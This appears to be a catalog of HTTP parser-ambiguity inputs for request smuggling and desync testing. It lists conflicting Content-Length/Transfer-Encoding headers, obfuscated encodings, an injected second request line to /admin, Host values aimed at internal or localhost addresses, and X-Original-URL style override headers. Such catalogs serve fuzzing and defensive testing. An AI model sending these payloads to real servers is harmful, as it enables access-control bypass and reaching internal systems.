# Ambiguity catalog — every disagreeable byte sequence

## The CL/TE ambiguities — the body-boundary disagreements

```text
Content-Length: 4
Transfer-Encoding: chunked
```

```text
Content-Length: 4
Transfer-Encoding: cow
```

```text
Content-Length: 4
Content-Length: 7
```

```text
Content-Length: 4
Transfer-Encoding : chunked
```

```text
Content-Length: 4
Transfer_Encoding: chunked
```

```text
Content-Length: 4
Transfer-Encoding: chunked,identity
```

```text
Content-Length: 4
Transfer-Encoding: chunked chunked
```

```text
Content-Length: 4
Transfer-Encoding: chunked;
```

```text
Content-Length: 4
Transfer-Encoding: xchunked
```

```text
Content-Length: 4
Transfer-Encoding: chunkedx
```

```text
Content-Length: 4
Transfer-Encoding: "chunked"
```

```text
Content-Length: 4
TE: chunked
```

```text
Content-Length: 4
Transfer-Encoding: chu\x00nked
```

```text
Content-Length: 4
Transfer-Encoding:\r\n chunked
```

## The CL ambiguities — the numeric-boundary disagreements

```text
Content-Length: 4
Content-Length: 4a
Content-Length: 0x10
Content-Length: +4
Content-Length: -1
Content-Length: 4.0
Content-Length:  4
Content-Length:4
Content-Length:\t4
Content-Length: 9999999999
Content_Length: 4
X-Content-Length: 4
```

## The method-boundary ambiguities

```text
GET / HTTP/1.1
get / HTTP/1.1
Get / HTTP/1.1
GPOST / HTTP/1.1
OPTIONS * HTTP/1.1
GET http://internal/path HTTP/1.1
CONNECT internal:80 HTTP/1.1
GET / HTTP/1.1 
```

## The Host ambiguities

```text
Host: a
Host: b
```

```text
Host: internal
Host: internal:9000
Host: localhost
Host: 127.0.0.1
```

## The version ambiguities

```text
POST / HTTP/1.0
POST / HTTP/1.1
POST / HTTP/0.9
POST / HTTP/2
```

## The request-line ambiguities

```text
GET /a HTTP/1.1
GET /b HTTP/1.1
```

```text
GET / HTTP/1.1\r\nGET /admin HTTP/1.1
```

## The header ambiguities

```text
Transfer-Encoding:
 chunked
```

```text
Header: value\r\n continuation
```

```text
X-Forwarded-Host: internal
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-HTTP-Method-Override: PUT
X-Real-IP: 127.0.0.1
```

## The chunk ambiguities

```text
5c;ext=x
005c
-1
ffffffff
5c\n
5c\t\r\n
```
